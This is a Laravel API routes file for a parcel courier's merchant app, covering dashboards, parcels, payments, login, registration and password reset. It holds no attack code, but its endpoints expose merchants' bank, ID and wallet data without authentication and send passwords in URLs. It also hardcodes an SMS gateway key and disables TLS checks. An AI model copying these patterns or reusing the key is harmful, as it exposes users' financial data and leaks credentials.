<?php

use App\Http\Controllers\api\DeliverymanApiController;
use App\Http\Controllers\api\MerchantApiController;
use App\Http\Controllers\api\PickupmanApiController;
use App\Models\Codcharge;
use App\Models\Deliverycharge;
use App\Models\Merchant;
use App\Models\Merchantpayment;
use App\Models\Nearestzone;
use App\Models\Parcel;
use App\Models\Parcelnote;
use App\Models\Parceltype;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Response;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Schema;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/

Route::middleware('auth:api')->get('/user', function (Request $request) {
    return $request->user();
});

//dashboard api
Route::get('/dashboard/{id}', function ($id) {
    $response = array();

    /*...............dashboard info...........*/
    $returnDelCharge = DB::table('parcels')->where([
        ['merchantId', '=', $id],
        ['status', '>', '5'],
        ['status', '<', '9'],
    ])->sum('deliveryCharge');


    $prepDelAmount = Parcel::where(['merchantId' => $id, 'status' => 4, 'percelType' => 1])->sum('deliveryCharge');


    $allPaidParcels = Parcel::where(['merchantId' => $id, 'merchantpayStatus' => 1])->get();

    $total = 0;
    $totalDel = 0;
    foreach ($allPaidParcels as $key => $parcel) {
        if (($parcel->status > 5 && $parcel->status < 9) || (($parcel->percelType == 1) && ($parcel->status == 4))) {
            $totalDel += $parcel->deliveryCharge;
        } else {
            if ($parcel->status == 4) {
                $total += $parcel->merchantPaid;
            }
        }
    }

    $return = [8];

    $response['total-parcel'] = Parcel::where(['merchantId' => $id])->count();
    $response['pending-parcel'] = Parcel::where(['merchantId' => $id, 'status' => 1])->count();
    $response['delivered-parcel'] = Parcel::where(['merchantId' => $id, 'status' => 4])->count();
    $response['canceled-parcel'] = Parcel::where(['merchantId' => $id, 'status' => 9])->count();


    $response['return-parcel'] = Parcel::where('merchantId', '=', $id)
        ->where(function ($query) use ($return) {
            $query->whereIn('status', $return);
        })
        ->count();


    $response['hold-parcel'] = Parcel::where(['merchantId' => $id, 'status' => 5])->count();
    $response['total-amount'] = Parcel::where(['merchantId' => $id, 'status' => 4])->sum('merchantAmount') - ($returnDelCharge + $prepDelAmount);

    $response['total-paid-amount'] = $total - $totalDel;

    //   $response['total-unpaid-amount']=Parcel::where(['merchantId'=>$id,'status'=>4])->whereNull('merchantpayStatus')->sum('merchantAmount');
    $response['total-unpaid-amount'] = $response['total-amount'] - $response['total-paid-amount'];
    /*...............dashboard info...........*/
    $response['total-parcel'] = Parcel::where(['merchantId' => $id])->count();
    $response['pending-parcel'] = Parcel::where(['merchantId' => $id, 'status' => 1])->count();
    $response['delivered-parcel'] = Parcel::where(['merchantId' => $id, 'status' => 4])->count();
    $response['canceled-parcel'] = Parcel::where(['merchantId' => $id, 'status' => 9])->count();
    $response['return-parcel'] = Parcel::where(['merchantId' => $id, 'status' => 8])->count();
    $response['hold-parcel'] = Parcel::where(['merchantId' => $id, 'status' => 5])->count();
    $response['total-amount'] = Parcel::where(['merchantId' => $id, 'status' => 4])->sum('merchantAmount');
    $response['total-unpaid-amount'] = Parcel::where(['merchantId' => $id, 'status' => 4])->whereNull('merchantpayStatus')->sum('merchantAmount');
    $response['total-paid-amount'] = Parcel::where(['merchantId' => $id, 'merchantpayStatus' => 1])->sum('merchantAmount');

    return $response;
});

// allorder api
Route::get('/allorder/{id}/{page}', function ($marchantId, $pageNumber) {
    $limit = 20;
    $offset = ($pageNumber - 1) * $limit;
    $response = '';

    if (!$pageNumber) {
        $data = DB::table('parcels')
            ->leftJoin('parceltypes', 'parceltypes.id', '=', 'parcels.status')
            ->where('parcels.merchantId', $marchantId)
            ->select('parcels.id', 'parcels.recipientName', 'parcels.trackingCode', 'parceltypes.title', 'parcels.created_at', 'parcels.merchantpayStatus', 'parcels.status_description')
            ->orderBy('id', 'desc')
            ->get();
    } else {
        $data = DB::table('parcels')
            ->leftJoin('parceltypes', 'parceltypes.id', '=', 'parcels.status')
            ->where('parcels.merchantId', $marchantId)
            ->select('parcels.id', 'parcels.trackingCode', 'parcels.recipientName', 'parceltypes.title', 'parcels.created_at', 'parcels.merchantpayStatus', 'parcels.status_description')
            ->orderBy('id', 'desc')
            ->skip($offset)
            ->take($limit)
            ->get();
    }

    if (isset($_GET['parcel_type'])) {
        $status = Parceltype::where('slug', $_GET['parcel_type'])->first()->id ?? '';
        $data = $data->where('parcels.status', '=', $status);
    }

    if (!empty($data)) {
        $response = array(
            'status_code' => 200,
            'page_number' => $pageNumber,
            'total_result' =>  count($data),
            'result' => $data
        );
    } else {
        $response = array(
            'status_code' => 400,
        );
    }

    return $response;
});

//all payment api
Route::get('/allpayment/{id}/{page}', function ($marchantId, $pageNumber) {

    $limit = 20;
    $offset = ($pageNumber - 1) * $limit;
    $response = '';
    if ($pageNumber) {
        $data = DB::table('merchantpayments')
            ->leftJoin('parcels', 'parcels.paymentInvoice', '=', 'merchantpayments.id')
            ->where('merchantpayments.merchantId', $marchantId)
            ->select('merchantpayments.id', 'merchantpayments.merchantId', 'merchantpayments.created_at', DB::raw('COUNT(parcels.paymentInvoice) As totalInvoice'), DB::raw('SUM(parcels.merchantPaid) As totalPaid'))
            ->groupBy('merchantpayments.id', 'merchantpayments.merchantId', 'merchantpayments.created_at')
            ->orderBy('id', 'desc')
            ->skip($offset)
            ->take($limit)
            ->get();
    } else {
        $data = DB::table('merchantpayments')
            ->leftJoin('parcels', 'parcels.paymentInvoice', '=', 'merchantpayments.id')
            ->where('merchantpayments.merchantId', $marchantId)
            ->select('merchantpayments.id', 'merchantpayments.merchantId', 'merchantpayments.created_at', DB::raw('COUNT(parcels.paymentInvoice) As totalInvoice'), DB::raw('SUM(parcels.merchantPaid) As totalPaid'))
            ->groupBy('merchantpayments.id', 'merchantpayments.merchantId', 'merchantpayments.created_at')
            ->orderBy('id', 'desc')
            ->get();
    }


    if (!empty($data)) {
        $response = array(
            'status_code' => 200,
            'page_number' => $pageNumber,
            'total_result' =>  count($data),
            'result' => $data
        );
    } else {
        $response = array(
            'status_code' => 400,
        );
    }

    return $response;
});

Route::get('/pdetails/{id}', function ($marchantId) {
    $response['result'] = DB::table('merchantpayments')
        ->where('merchantpayments.merchantId', $marchantId)
        ->orderBy('id', 'desc')
        ->get();

    return $response;
});

Route::get('nearestzone', function () {
    $response['result'] = Nearestzone::where('status', 1)
        ->select('nearestzones.zonename', 'nearestzones.id')
        ->get();
    return $response;
});


//get parcel service
Route::get('/service', function () {

    $response = '';
    $deliveryData = Deliverycharge::where('status', 1)->get();

    if (!empty($deliveryData)) {
        $response = array(
            'status_code' => 200,
            'total_result' => count($deliveryData),
            'result' => $deliveryData,
        );
    } else {
        $response = array(
            'status_code' => 400,
        );
    }

    return $response;
});

// get cod
Route::get('cod', function () {

    $response = '';

    $codcharge = Codcharge::where('status', 1)->orderBy('id', 'DESC')->first();

    if (!empty($codcharge)) {
        $response = array(
            'status_code' => 200,
            'result' => $codcharge,
        );
    } else {
        $response = array(
            'status_code' => 400,
        );
    }

    return $response;
});

//get company info
Route::get('companyinfo/{id}', function ($marchantId) {
    $response = Merchant::where([
        ['status', '=', '1'],
        ['id', '=', $marchantId],
    ])->first();

    if ($response) {
        return array(
            'success' => true,
            'data' => $response,
        );
    }
    return array(
        'success' => false,
        'message' => 'Invalid merchant id',
    );
});


//get owner info
Route::get('ownerinfo/{id}', function ($marchantId) {
    $response['result'] = Merchant::where([
        ['status', '=', '1'],
        ['id', '=', $marchantId],
    ])
        ->select('merchants.firstName', 'merchants.phoneNumber', 'merchants.otherphoneNumber', 'merchants.emailAddress', 'merchants.nidnumber')
        ->get();
    return $response;
});

//get pickup method
Route::get('pmethod/{id}', function ($marchantId) {
    $response['result'] = Merchant::where([
        ['status', '=', '1'],
        ['id', '=', $marchantId],
    ])
        ->select('merchants.mAdress', 'merchants.pickLocation', 'merchants.nearestZone', 'merchants.pickupPreference')
        ->get();
    return $response;
});


//get payment method
Route::get('paymethod/{id}', function ($marchantId) {
    $response['result'] = Merchant::where([
        ['status', '=', '1'],
        ['id', '=', $marchantId],
    ])
        ->select('merchants.payOption', 'merchants.withdrawal')
        ->get();
    return $response;
});

//get bank info
Route::get('bankinfo/{id}', function ($marchantId) {
    $response['result'] = Merchant::where([
        ['status', '=', '1'],
        ['id', '=', $marchantId],
    ])
        ->select('merchants.nameOfBank', 'merchants.bankBranch', 'merchants.bankAcHolder', 'merchants.bankAcNo')
        ->get();
    return $response;
});

//get other account
Route::get('otheraccount/{id}', function ($marchantId) {
    $response['result'] = Merchant::where([
        ['status', '=', '1'],
        ['id', '=', $marchantId],
    ])
        ->select('merchants.bkashNumber', 'merchants.roketNumber', 'merchants.nogodNumber')
        ->get();
    return $response;
});



/*.............updata marchant info................*/

// update company info
Route::post('merchant/company_update', function (Request $request) {

    try {
        $update_merchant = Merchant::find($request->id);
        $update_merchant->trade_licence_no = $request->trade_licence_no;
        $update_merchant->website = $request->website;
        $update_merchant->facebook_page = $request->facebook_page;

        if ($update_merchant->save()) {
            return $response = array('success' => true, 'message' => '');
        } else {
            return $response = array('success' => false, 'message' => 'Update failed');
        }
    } catch (Exception $e) {
        return $response = array('success' => false, 'message' => $e->getMessage());
    }
});

//update owner
// Route::get('updateowner/{id}/{name}/{phone}/{ophone}/{email}/{nid}', function ($id, $name, $phone, $ophone, $email, $nid) {
//     // Merchant Profile Edit

//     $updname = NULL;
//     $updphone = NULL;
//     $updophone = NULL;
//     $updemail = NULL;
//     $updnid = NULL;

//     if ($name) {
//         $updname = $name;
//     }
//     if ($phone) {
//         $updphone = $phone;
//     }
//     if ($ophone) {
//         $updophone = $ophone;
//     }
//     if ($email) {
//         $updemail = $email;
//     }
//     if ($nid) {
//         $updnid = $nid;
//     }

//     $update_merchant = Merchant::find($id);
//     $update_merchant->firstName = $updname;
//     $update_merchant->phoneNumber = $updphone;
//     $update_merchant->otherphoneNumber = $updophone;
//     $update_merchant->emailAddress = $updemail;
//     $update_merchant->nidnumber = $updnid;

//     // $update_merchant->save();
//     if ($update_merchant->save()) {
//         return $response = array('success' => true, 'message' => '');
//     } else {
//         return $response = array('success' => false, 'message' => 'Update failed');
//     }
// });

//update pickup method
Route::get('updatepickup/{id}/{address}/{paddress}/{preff}', function ($id, $address, $paddress, $preff) {

    $updadd = NULL;
    $updpadd = NULL;
    $updpreff = NULL;

    if ($address) {
        $updadd = $address;
    }
    if ($paddress) {
        $updpadd = $paddress;
    }

    if ($preff) {
        $updpreff = $preff;
    }

    $update_merchant = Merchant::find($id);
    $update_merchant->mAdress = $updadd;
    $update_merchant->pickLocation = $updpadd;
    $update_merchant->pickupPreference = $updpreff;

    if ($update_merchant->save()) {
        return $response = array('success' => true, 'message' => '');
    } else {
        return $response = array('success' => false, 'message' => 'Update failed');
    }
});

//update payment method
Route::get('updatepay/{id}/{paymethod}/{widthdraw}', function ($id, $paymethod, $widthdraw) {

    $updpay = NULL;
    $updwidthdraw = NULL;

    if ($paymethod) {
        $updpay = $paymethod;
    }
    if ($widthdraw) {
        $updwidthdraw = $widthdraw;
    }

    $update_merchant = Merchant::find($id);
    $update_merchant->paymentMethod = $updpay;
    $update_merchant->payoption = $updpay;
    $update_merchant->withdrawal = $updwidthdraw;
    if ($update_merchant->save()) {
        return $response = array('success' => true, 'message' => '');
    } else {
        return $response = array('success' => false, 'message' => 'Update failed');
    }
});

//update bank account
Route::get('updatebank/{id}/{bankname}/{branch}/{acholder}/{acno}', function ($id, $bankname, $branch, $acholder, $acno) {
    // return $response = array('formsubmit'=> 'success');    
    $updbankname = NULL;
    $updbranch = NULL;
    $updacholder = NULL;
    $updacno = NULL;

    if ($bankname) {
        $updbankname = $bankname;
    }
    if ($branch) {
        $updbranch = $branch;
    }
    if ($acholder) {
        $updacholder = $acholder;
    }
    if ($acno) {
        $updacno = $acno;
    }

    $update_merchant = Merchant::find($id);

    $update_merchant->nameOfBank = $updbankname;
    $update_merchant->bankBranch = $updbranch;
    $update_merchant->bankAcHolder = $updacholder;
    $update_merchant->bankAcNo = $updacno;


    if ($update_merchant->save()) {
        return $response = array('formsubmit' => 'success');
    }
});

//update other account
Route::get('updateother/{id}/{bkash}/{roket}/{nogod}', function ($id, $bkash, $roket, $nogod) {
    // return $response = array('formsubmit'=> 'success');
    $updbkash = NULL;
    $updroket = NULL;
    $updnogod = NULL;


    if ($bkash) {
        $updbkash = $bkash;
    }
    if ($roket) {
        $updroket = $roket;
    }
    if ($nogod) {
        $updnogod = $nogod;
    }


    $update_merchant = Merchant::find($id);

    $update_merchant->bkashNumber = $updbkash;
    $update_merchant->roketNumber = $updroket;
    $update_merchant->nogodNumber = $updnogod;


    if ($update_merchant->save()) {
        return $response = array('formsubmit' => 'success');
    }
});

/*.............updata marchant info................*/

//marchant support
Route::get('support/{id}/{subj}/{desc}', function ($mId, $sub, $desc) {

    $send = 0;
    $findMerchant = Merchant::find($mId);
    $data = array(
        'contact_email' => $findMerchant->emailAddress,
        'description' => $desc,
        'sub' => $sub
    );

    $send = Mail::send('frontEnd.emails.support', $data, function ($textmsg) use ($data) {
        $textmsg->from('info@sensorbd.com');
        $textmsg->to('support@sensorbd.com');
        $textmsg->subject($data['description']);
    });

    $send = 1;
    if ($send) {
        return response()->json(['success' => true, 'message' => '']);
    } else {
        return response()->json(['success' => false, 'message' => '']);
    }
});

//parcel details
Route::get('parcelinfo/{mid}/{pid}', function ($mid, $pid) {

    $parceldetails = DB::table('parcels')
        ->where(['parcels.merchantId' => $mid, 'parcels.id' => $pid])
        ->select('parcels.*')
        ->first();
    if ($parceldetails->reciveZone && $parceldetails->deliverymanId) {
        $details = DB::table('parcels')
            ->leftJoin('nearestzones', 'parcels.reciveZone', '=', 'nearestzones.id')
            ->where(['parcels.merchantId' => $mid, 'parcels.id' => $pid])
            ->leftJoin('parceltypes', 'parcels.status', '=', 'parceltypes.id')
            ->leftJoin('deliverymen', 'deliverymen.id', '=', 'parcels.deliverymanId')
            ->select('parcels.*', 'nearestzones.zonename', 'parceltypes.title', 'deliverymen.name')
            ->first();

        return Response::json($details);
    } else if ($parceldetails->reciveZone && empty($parceldetails->deliverymanId)) {
        $details = DB::table('parcels')
            ->leftJoin('nearestzones', 'parcels.reciveZone', '=', 'nearestzones.id')
            ->where(['parcels.merchantId' => $mid, 'parcels.id' => $pid])
            ->leftJoin('parceltypes', 'parcels.status', '=', 'parceltypes.id')
            ->select('parcels.*', 'nearestzones.zonename', 'parceltypes.title')
            ->first();

        return Response::json($details);
    } else {
        $details = DB::table('parcels')
            ->where(['parcels.merchantId' => $mid, 'parcels.id' => $pid])
            ->leftJoin('parceltypes', 'parcels.status', '=', 'parceltypes.id')
            ->select('parcels.*', 'parceltypes.title')
            ->first();

        return Response::json($details);
    }
});

//payment details
Route::get('paymentinfo/{mid}/{id}', function ($mid, $id) {

    $merchantInfo = DB::table('merchants')
        ->where('merchants.id', $mid)
        ->select('merchants.companyName', 'merchants.phoneNumber')
        ->get();

    $invoiceInfo = Merchantpayment::find($id);
    $inovicedetails = Parcel::where('paymentInvoice', $id)->get();

    $response = '';
    if ($merchantInfo && $invoiceInfo && $inovicedetails) {
        $response = array(
            'marchantinfo' => $merchantInfo,
            'invoiceinfo' => array(
                'invid' => $invoiceInfo->id,
                'date' => date('F d, Y', strtotime($invoiceInfo->created_at)),
                'time' => date('h:i:s a', strtotime($invoiceInfo->created_at))
            ),
            'invdetails' => array(
                'trackingid' => $inovicedetails[0]->trackingCode,
                'recptname' => $inovicedetails[0]->recipientName,
                'recptphone' => $inovicedetails[0]->recipientPhone,
                'total' => $inovicedetails[0]->cod,
                'charge' => $inovicedetails[0]->deliveryCharge + $inovicedetails[0]->codCharge,
                'subtotal' => $inovicedetails[0]->cod - ($inovicedetails[0]->deliveryCharge + $inovicedetails[0]->codCharge),
                'payment' => $inovicedetails[0]->merchantPaid
            )
        );
    }

    return Response::json($response);
});


//login
Route::get('login/{phone}/{pass}', function ($phone, $pass) {
    $response = '';
    $merchantChedk = Merchant::where('phoneNumber', $phone)
        ->orWhere('emailAddress', $phone)
        ->first();
    if ($merchantChedk) {
        if ($merchantChedk->status == 0 || $merchantChedk->verify == 0) {
            return $response = array(
                'error' => 'your account expired',
                'success' => 0
            );
        } else {
            if (password_verify($pass, $merchantChedk->password)) {
                $merchantId = $merchantChedk->id;
                return $response = array(
                    'error' => '',
                    'success' => $merchantId
                );
            } else {
                return $response = array(
                    'error' => 'password wrong',
                    'success' => 0
                );
            }
        }
    } else {
        return $response = array(
            'error' => 'your are not registered',
            'success' => 0
        );
    }
});

//register
Route::get('register/{cname}/{phone}/{email}/{nid}/{pass}/{pmethod}/{bkash},{nogod},{bankac},{bname},{branch},{holder}', function ($cname, $phone, $email, $nid, $pass, $pmethod, $bkash, $nogod, $bankac, $bname, $branch, $holder) {
    $marchentPhone = Merchant::where('phoneNumber', $phone)->first();
    if ($marchentPhone) {
        return $response = array(
            'error' => 'Phone no already registered',
            'success' => 0
        );
    } else {
        $verifyToken = rand(111111, 999999);
        $store_data    = new Merchant();

        if ($pmethod == "1") {
            $store_data->bankAcNo = $bankac;
            $store_data->nameOfBank = $bname;
            $store_data->bankBranch = $branch;
            $store_data->bankAcHolder = $holder;
        } else if ($pmethod == "2") {
            $store_data->bkashNumber = $bkash;
        } else {
            $store_data->nogodNumber = $nogod;
        }
        $store_data->companyName = $cname;
        $store_data->phoneNumber = $phone;
        if ($email) {
            $store_data->emailAddress = $email;
        }
        if ($nid) {
            $store_data->nidnumber =  $nid;
        }

        $store_data->paymentMethod =   $pmethod;
        $store_data->socialLink    =   NULL;
        $store_data->status        =   1;
        $store_data->verify        =   $verifyToken;
        $store_data->password        =    bcrypt($pass);
        $store_data->save();

        $merchantId = $store_data->id;
        $url = 'https://24smsbd.com/api/bulkSmsApi';
        $apiKey = "c2Vuc29yYmQ6c2Vuc29yYmQxMjM0NTY3ODk=";
        $sender_id = 1498;

        $data = array(
            'sender_id' => $sender_id,
            'apiKey' => $apiKey,
            'mobileNo' => $phone,
            'message' => "Welcome!, Please collect your verify code $verifyToken"
        );

        $curl = curl_init($url);
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
        $res = curl_exec($curl);
        curl_close($curl);
        if ($res) {
            return $response = array(
                'error' => '',
                'success' => $merchantId
            );
        } else if (!empty($merchantId)) {
            return $response = array(
                'error' => '',
                'success' => $merchantId
            );
        } else {
            return $response = array(
                'error' => 'Register failed',
                'success' => 0
            );
        }
    }
});

//verify account
Route::get('verify/{id}/{pin}', function ($id, $pin) {
    $verified = Merchant::find($id);
    $verifydbtoken = $verified->verify;
    $verifyformtoken = $pin;
    if ($verifydbtoken == $verifyformtoken) {
        $verified->verify = 1;
        $verified->Save();
        return $response = array(
            'error' => '',
            'success' => 1
        );
    } else {
        return $response = array(
            'error' => 'Invalid code',
            'success' => 0
        );
    }
});

//get marchant info
Route::get('marchantinfo/{id}', function ($id) {
    $merchantInfo = DB::table('merchants')
        ->where('merchants.id', $id)
        ->select('merchants.companyName', 'merchants.phoneNumber', 'merchants.firstname')
        ->get();
    if ($merchantInfo) {
        return $response = array('status' => 'success', 'result' => $merchantInfo);
    }
});

//get delivery charge generate information
Route::get('generatedeliverycharg/{type}/{cod}/{weight}/{service}/{mid}', function ($type, $cod, $weight, $service, $mid) {
    //merchant info
    $mercharntInfo = Merchant::where('id', $mid)->first();
    //get deliverycharge info
    $deliveryChargeInfo = Deliverycharge::where(['id' => $service])->first();
    $discountDelCharge = $deliveryChargeInfo->deliverycharge - (($deliveryChargeInfo->deliverycharge * $mercharntInfo->del_commission) / 100);

    //cod charge
    $codcharges = (floatval(Codcharge::where(['status' => 1])->first()->codcharge) * $cod) / 100;
    $discountCodCharge = $codcharges - (($codcharges * $mercharntInfo->cod_commission) / 100);

    if ($type == 1) {
        if ($weight > 1) {
            $extraweight = $weight - 1;
            $deliverycharge = ($discountDelCharge * 1) + ($extraweight * $deliveryChargeInfo->extradeliverycharge);
        } else {
            $deliverycharge = $discountDelCharge;
        }
        return response()->json(['deliverycharge' => round($deliverycharge), 'codcharge' => 0]);
    } else {
        if ($weight > 1) {
            $extraweight = $weight - 1;
            $deliverycharge = ($discountDelCharge * 1) + ($extraweight * $deliveryChargeInfo->extradeliverycharge);
        } else {
            $deliverycharge = $discountDelCharge;
        }

        // fixed cod charge
        //  if($cod > 1000){
        //   $extracodcharge = ($cod-1000)/100;
        //   $codcharge = $discountCodCharge + $extracodcharge;
        //  }else{
        //   $codcharge = $discountCodCharge;
        //  }
        $codcharge = $discountCodCharge;
        return response()->json(['deliverycharge' => round($deliverycharge), 'codcharge' => round($codcharge)]);
    }
});

//password reset 
Route::get('resetpass/{phone}', function ($phone) {
    $validMerchant = Merchant::Where('phoneNumber', $phone)
        ->first();
    if ($validMerchant) {
        $verifyToken = rand(111111, 999999);
        $validMerchant->passwordReset     =    $verifyToken;
        $validMerchant->save();

        $url = 'https://24smsbd.com/api/bulkSmsApi';
        $apiKey = "c2Vuc29yYmQ6c2Vuc29yYmQxMjM0NTY3ODk=";
        $sender_id = 1498;

        $data = array(
            'sender_id' => $sender_id,
            'apiKey' => $apiKey,
            'mobileNo' => "0" . $validMerchant->phoneNumber,
            'message' => "Dear $validMerchant->firstName, \r\n Your password reset token is $verifyToken. Enjoy our services. If any query call us 01404477009 \r\nRegards\r\n Sensor Courier "
        );

        $curl = curl_init($url);
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
        $response = curl_exec($curl);
        curl_close($curl);

        return $responses = array(
            'error' => '',
            'success' => 1
        );
    } else {
        return $responses = array(
            'error' => 'Invalid phone number',
            'success' => 0
        );
    }
});

//verify code
Route::get('verifyresetpass/{phoneno}/{verifypin}/{newpass}', function ($phoneno, $verifypin, $newpass) {

    $validMerchant = Merchant::Where('phoneNumber', $phoneno)
        ->first();

    if ($validMerchant->passwordReset == $verifypin) {
        $validMerchant->password =    bcrypt($newpass);
        $validMerchant->passwordReset = NULL;
        $validMerchant->save();

        return $responses = array(
            'error' => '',
            'success' => 1
        );
    } else {
        return $responses = array(
            'error' => 'Something was wrong',
            'success' => 0
        );
    }
});


//test 
//payment details
Route::get('pmtinfo/{mid}/{id}', function ($mid, $id) {

    $merchantInfo = DB::table('merchants')
        ->where('merchants.id', $mid)
        ->select('merchants.companyName', 'merchants.phoneNumber')
        ->get();

    $invoiceInfo = Merchantpayment::find($id);
    $inovicedetails = Parcel::where('paymentInvoice', $id)->get();

    $response = '';
    if ($merchantInfo && $invoiceInfo && $inovicedetails) {
        $response = array(
            'marchantCompany' => $merchantInfo[0]->companyName,
            'marchantPhone' => $merchantInfo[0]->phoneNumber,
            'invoiceId' => $invoiceInfo->id,
            'invoiceDate' => date('F d, Y', strtotime($invoiceInfo->created_at)),
            'invoiceTime' => date('h:i:s a', strtotime($invoiceInfo->created_at)),
            'invdetails' => $inovicedetails,
        );
    }

    return Response::json($response);
});

//test
Route::post('test', function (Request $request) {
    return Response::json($request->all());
});

//parcel create
Route::post('createparcel', function (Request $request) {

    /* ..................... */
    //merchant info
    $mercharntInfo = Merchant::where('id', $request->mid)->first();

    //delivery charge info
    $deliveryChargeInfo = Deliverycharge::where(['id' => $request->orderType])->first();
    $discountDelCharge = $deliveryChargeInfo->deliverycharge - (($deliveryChargeInfo->deliverycharge * $mercharntInfo->del_commission) / 100);

    //cod charge
    // $codchargeInfo = Codcharge::where(['status'=>1])->first();
    // $discountCodCharge = $codchargeInfo->codcharge - (($codchargeInfo->codcharge * $mercharntInfo->cod_commission) / 100);
    $codcharges = (floatval(Codcharge::where(['status' => 1])->first()->codcharge) * $request->cod) / 100;
    $discountCodCharge = $codcharges - (($codcharges * $mercharntInfo->cod_commission) / 100);

    $pdeliverycharge = 0;
    $pcodecharge = 0;
    if ($request->ptype == 1) {

        if ($request->weight > 1) {
            $extraweight = $request->weight - 1;
            $deliverycharge = ($discountDelCharge * 1) + ($extraweight * $deliveryChargeInfo->extradeliverycharge);
        } else {
            $deliverycharge = $discountDelCharge;
        }
        $pdeliverycharge = $deliverycharge;
    } else {
        if ($request->weight > 1) {
            $extraweight = $request->weight - 1;
            $deliverycharge = ($discountDelCharge * 1) + ($extraweight * $deliveryChargeInfo->extradeliverycharge);
        } else {
            $deliverycharge = $discountDelCharge;
        }

        // fixed cod charge
        // if($request->cod > 1000){
        //   $extracodcharge = ($request->cod-1000)/100;
        //   $codcharge = $discountCodCharge + $extracodcharge;
        // }else{
        //   $codcharge= $discountCodCharge;
        // }

        $codcharge = $discountCodCharge;

        $pdeliverycharge = $deliverycharge;
        $pcodecharge = $codcharge;
    }

    /* ..................... */

    if ($request->ptype == 1) {
        $merchantAmount = 0;
        $merchantDue = 0;
        $deliverycahrge = $pdeliverycharge;
        $pcodecharge =  0;
    } else {
        $merchantAmount = $request->cod - (round($pdeliverycharge) + round($pcodecharge));
        $merchantDue = $request->cod - (round($pdeliverycharge) + round($pcodecharge));
        $deliverycahrge = $pdeliverycharge;
        $pcodecharge =  $pcodecharge;
    }


    $codcharges = Codcharge::where(['status' => 1])->first();

    $tracking_code   = "SC-" . mt_rand(111111, 999999);
    $store_parcel = new Parcel;
    $store_parcel->invoiceNo = $request->invoiceno;
    $store_parcel->merchantId = $request->mid;
    $store_parcel->cod = $request->cod;
    $store_parcel->percelType = $request->ptype;
    $store_parcel->recipientName = $request->name;
    $store_parcel->recipientAddress = $request->address;
    $store_parcel->recipientPhone = $request->phonenumber;
    $store_parcel->productWeight = $request->weight;
    $store_parcel->trackingCode  = $tracking_code;
    $store_parcel->note = $request->note;
    $store_parcel->deliveryCharge = round($deliverycahrge);
    $store_parcel->codCharge = round($pcodecharge);
    $store_parcel->reciveZone = $request->rzone;
    $store_parcel->productPrice = $request->actualPrice;
    $store_parcel->merchantAmount = $merchantAmount;
    $store_parcel->merchantDue = $merchantDue;
    $store_parcel->orderType = $request->orderType;
    $store_parcel->codType = $codcharges->id;
    $store_parcel->status = 1;
    $store_parcel->save();
    $note = new Parcelnote();
    $note->parcelId = $store_parcel->id;
    $note->note = 'parcel create successfully';
    $note->save();


    $data = array(
        'trackingCode' =>  $store_parcel->trackingCode,
        'subject' => 'New Parcel Place',
    );

    $send = Mail::send('frontEnd.emails.parcelplace', $data, function ($textmsg) use ($data) {
        $textmsg->to('info@sensorbd.com');
        $textmsg->subject($data['subject']);
    });

    if ($send && $store_parcel->id) {
        return $response = array('formsubmit' => 'success', 'trackingcode' => $store_parcel->trackingCode);
    } else if ($store_parcel->id) {
        return $response = array('formsubmit' => 'success', 'trackingcode' => $store_parcel->trackingCode);
    } else {
        return $response = array('formsubmit' => '');
    }
});

//marchant register
Route::post('mregister', function (Request $request) {

    $marchentPhone = Merchant::where('phoneNumber', $request->phone)->first();
    if ($marchentPhone) {
        return $response = array(
            'error' => 'Phone no already registered',
            'success' => 0
        );
    } else {
        $verifyToken = rand(111111, 999999);
        $store_data    = new Merchant();

        $store_data->payoption = $request->pmethod;
        if ($request->pmethod == "1") {
            $store_data->nameOfBank = $request->bname;
            $store_data->bankBranch = $request->branch;
            $store_data->bankAcHolder = $request->holder;
            $store_data->bankAcNo = $request->bankac;
        } elseif ($request->pmethod == "2") {
            $store_data->bkashNumber   =   $request->bkash;
        } elseif ($request->pmethod == "3") {
            $store_data->nogodNumber  =   $request->nogod;
        }

        $store_data->companyName   =   $request->cname;
        $store_data->firstName     =   $request->marchantName;
        $store_data->phoneNumber   =   $request->phone;

        if ($request->email) {
            $store_data->emailAddress = $request->email;
        }
        if ($request->nid) {
            $store_data->nidnumber =  $request->nid;
        }


        $store_data->pickLocation  =   $request->pickLocation;
        $store_data->paymentMethod =   $request->paymentMethod;
        $store_data->socialLink    =   $request->socialLink;
        $store_data->status        =   1;
        $store_data->verify        =   $verifyToken;
        $store_data->agree         =   $request->agree;
        $store_data->password        =    bcrypt(request('pass'));
        $store_data->save();
        $merchantId = $store_data->id;

        $url = 'https://24smsbd.com/api/bulkSmsApi';
        $apiKey = "c2Vuc29yYmQ6c2Vuc29yYmQxMjM0NTY3ODk=";
        $sender_id = 1498;
        $data = array(
            'sender_id' => $sender_id,
            'apiKey' => $apiKey,
            'mobileNo' => $request->phone,
            'message' => "Welcome!, Please collect your verify code $verifyToken",
        );

        $curl = curl_init($url);
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
        $res = curl_exec($curl);
        curl_close($curl);

        if ($res) {
            return $response = array(
                'error' => '',
                'success' => $merchantId
            );
        } else if (!empty($merchantId)) {
            return $response = array(
                'error' => '',
                'success' => $merchantId
            );
        } else {
            return $response = array(
                'error' => 'Register failed',
                'success' => 0
            );
        }
    }
});

Route::post('test', function (Request $request) {
    return  $request->all();
});

/*********
 *  Merchant panel 
 */

Route::group(['namespace' => 'Api', 'prefix' => 'merchant'], function () {

